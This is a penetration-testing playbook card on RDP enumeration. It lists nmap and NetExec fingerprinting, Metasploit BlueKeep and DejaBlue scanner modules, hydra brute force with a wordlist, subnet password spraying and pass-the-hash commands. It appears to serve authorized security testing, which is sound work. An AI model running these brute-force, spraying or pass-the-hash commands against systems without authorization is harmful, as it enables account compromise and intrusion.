---
id: rdp-enum
title: RDP Enumeration
stage: enumeration
tags: [windows, rdp]
tools:
  - nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $TARGET
  - nxc rdp $TARGET
  - hydra -L users.txt -P passwords.txt rdp://$TARGET -t 4
leads_to: [rdp-access, password-spray, public-exploit]
summary: Check NLA status, enumerate RDP encryption level, and test for known vulnerabilities.
---

## Confirm & Fingerprint

```bash
nmap -p3389 --script rdp-enum-encryption $TARGET
nxc rdp $TARGET
# Look for: NLA enabled/disabled, OS version, security layer (RDP, TLS, CredSSP)
```

## Check for Known Vulnerabilities

```bash
# MS12-020 (DoS) and generic vuln check
nmap -p3389 --script rdp-vuln-ms12-020 $TARGET

# BlueKeep (CVE-2019-0708) — pre-auth RCE on Windows 7 / Server 2008
# Use Metasploit — verify only, not exploit blindly
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS $TARGET
run

# DejaBlue (CVE-2019-1181/1182) — Windows 8+/Server 2012+
use auxiliary/scanner/rdp/cve_2019_1181_dejablue
```

## Brute Force (NLA Disabled Only)

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://$TARGET -t 4
nxc rdp $TARGET -u users.txt -p passwords.txt --continue-on-success
```

## Spray Known Creds Across Subnet

```bash
nxc rdp $CIDR -u administrator -p 'Password123'
nxc rdp $CIDR -u administrator -H <NTLM_hash>  # PTH — RestrictedAdmin must be enabled
```

## Notes

- NLA (Network Level Authentication) challenges credentials before showing login — brute force still works but slower
- RestrictedAdmin mode allows Pass-the-Hash over RDP: `xfreerdp /v:$TARGET /u:admin /pth:<hash>`
- RDP on non-standard ports: 3390, 13389 — check all ports during nmap scan
- BlueKeep is unreliable and often crashes the host — avoid unless controlled environment
